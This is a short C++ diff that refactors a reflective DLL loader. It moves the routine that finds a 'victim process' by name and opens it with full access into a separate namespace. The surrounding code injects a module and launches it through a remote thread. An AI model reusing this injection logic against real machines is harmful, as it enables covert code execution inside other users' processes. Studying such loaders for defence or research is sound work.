@@ -4,6 +4,16 @@
 #include <iterator>
 #include "tlhelp32.h"
 
+namespace reflective_loader_utils
+{
+
+NO_DISCARD ProcessPtr find_victim_process()
+{
+	return std::make_unique<Process>(process_utils::get_pid_by_name(VICTIM_PROCESS.data()), ProcessAccess::ProcessAllAccess);
+}
+
+}
+
 ReflectiveLoader::ReflectiveLoader(Pid pid, const ProcessAccess access_rights, const ByteVector& module_bytes, const std::wstring& command_line) :
 	m_victim_process(std::make_unique<Process>(pid, access_rights)),
 	m_module_to_inject(module_bytes),
@@ -14,7 +24,7 @@ ReflectiveLoader::ReflectiveLoader(Pid pid, const ProcessAccess access_rights, c
 }
 
 ReflectiveLoader::ReflectiveLoader(const ByteVector& module_bytes, const std::wstring& command_line) :
-	m_victim_process(find_victim_process()),
+	m_victim_process(reflective_loader_utils::find_victim_process()),
 	m_module_to_inject(module_bytes),
 	m_entrypoint_rva(get_entrypoint_from_exports(m_module_to_inject)),
 	m_command_line(command_line),
@@ -45,11 +55,6 @@ void ReflectiveLoader::run_module_in_victim()
 		ThreadCreationFlags::ThreadCreationNone,
 		reinterpret_cast<LPTHREAD_START_ROUTINE>(m_remote_address + m_entrypoint_rva),
 		reinterpret_cast<LPVOID>(m_param));
-}
-
-NO_DISCARD ProcessPtr ReflectiveLoader::find_victim_process()
-{
-	return std::make_unique<Process>(process_utils::get_pid_by_name(VICTIM_PROCESS.data()), ProcessAccess::ProcessAllAccess);
 }
 
 NO_DISCARD Address64 ReflectiveLoader::get_entrypoint_from_exports(const ByteVector& module_to_inject)
